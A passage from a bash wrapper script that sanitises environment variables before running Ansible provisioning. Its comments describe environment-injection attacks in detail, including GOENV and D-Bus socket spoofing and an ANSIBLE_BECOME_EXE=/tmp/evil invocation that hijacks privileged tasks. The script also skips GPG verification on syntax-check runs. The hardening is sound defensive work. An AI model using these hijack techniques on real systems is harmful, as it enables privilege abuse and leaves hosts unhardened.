unset GOPROXY GONOSUMDB GOFLAGS GOENV  # Go env injection: GOPROXY redirects module downloads to attacker proxy; GONOSUMDB=* disables checksum verification for all modules; GOFLAGS injects arbitrary go build flags; GOENV=/tmp/evil sets all of the above via a file the Go toolchain reads before per-command env vars (printenv shows no suspicious values yet go uses them)
unset DBUS_SESSION_BUS_ADDRESS  # D-Bus socket poisoning — dconf.py (community.general.dconf) reads DBUS_SESSION_BUS_ADDRESS first via os.environ.get before the canonical /run/user/<uid>/bus socket; _validate_address only requires dbus-send exit 0, which any cooperating fake daemon satisfies; an attacker-set DBUS_SESSION_BUS_ADDRESS=unix:path=/tmp/evil.sock routes all community.general.dconf calls (GNOME settings in roles/desktop/tasks/main.yml: show-in-lock-screen, location/enabled, remember-recent-files) to a fake daemon that silently no-ops; unsetting forces dconf.py to fall through to /run/user/<uid>/bus (canonical, non-spoofable) or dbus-run-session fallback; system-level CIS dconf hardening (roles/system/tasks/dconf.yml) writes to /etc/dconf/db/ via ansible.builtin.copy and is not affected
export ANSIBLE_BECOME_METHOD=sudo  # pin become_method — ANSIBLE_BECOME_METHOD=su activates the su plugin which reads its own executable path from ANSIBLE_SU_EXE; neither is constrained by become_exe=/usr/bin/sudo in ansible.cfg, so an attacker can route all become tasks (system, packages, repos_dnf roles) through an arbitrary binary; pinning to sudo ensures only the sudo plugin is used
unset ANSIBLE_SU_EXE ANSIBLE_PFEXEC_EXE ANSIBLE_SUDO_EXE  # remove per-plugin exe escape paths — each alternative become plugin (su, pfexec, sudo) exposes its own executable env var; clearing all three prevents ANSIBLE_BECOME_METHOD override from activating a residual attacker-controlled executable even if pinning above is somehow circumvented
export PATH=/usr/local/bin:/usr/bin:/bin  # pin PATH — prevents PATH=/attacker:$PATH hijacking args[0] resolution
export ANSIBLE_BECOME_EXE=/usr/bin/sudo  # pin become_exe — ANSIBLE_BECOME_EXE env var takes precedence over ansible.cfg become_exe; without this pin, 'ANSIBLE_BECOME_EXE=/tmp/evil make all' routes every Play 1 become task through an arbitrary binary that can exec real sudo transparently while silently rewriting sshd_config, authorized_keys, and audit rules
export ANSIBLE_BECOME_USER=root  # pin become_user — ANSIBLE_BECOME_USER env var overrides the implicit root default for all Play 1 become: true tasks; 'ANSIBLE_BECOME_USER=dfarrell make all' causes sudo to run as the invoking user rather than root, making all system file writes (sysctl, sshd_config, PAM, audit rules, firewall) fail with EACCES; many failures are swallowed by CSB rescue blocks leaving the host unhardened while provisioning appears to succeed
unset ANSIBLE_BECOME_PASS ANSIBLE_SUDO_PASS  # strip pre-seeded become password — ANSIBLE_BECOME_PASS=wrong_password causes all Play 1 become:true tasks to fail with sudo auth errors; CSB rescue blocks silently absorb the failures (logged to CSB report, provisioning continues) leaving the host unhardened; additionally a pre-seeded ANSIBLE_BECOME_PASS exposes the plaintext credential in /proc/<pid>/environ to any root process during provisioning; the playbook uses cached sudo credentials (NOPASSWD or interactive prompt via sudo), not env-var credentials, so these vars are never needed

# Verify collections integrity (defense-in-depth: supply chain verification).
# GPG key verification is automatically bypassed for non-provisioning invocations
# (--syntax-check, molecule, ansible-lint) where only playbook syntax is checked,
# not actual collection code execution. Production provisioning requires the key.
_is_syntax_only=false
for _arg in "${args[@]}"; do
    [[ "$_arg" == '--syntax-check' ]] && _is_syntax_only=true && break
done
if "$_is_syntax_only"; then
    export SKIP_GPG_VERIFY=1
fi
"${_repo_root}/scripts/verify-collections.sh"

# All checks passed — exec the remaining arguments (ansible-playbook or molecule with its args).
# Using exec replaces this script's process with the command, preserving exit codes and
# signals. The Makefile uses: scripts/verify-ansible-args.sh ansible-playbook site.yml ...
# which passes the full command as $@.
if [[ ${#args[@]} -gt 0 ]]; then
    exec "${args[@]}"
fi
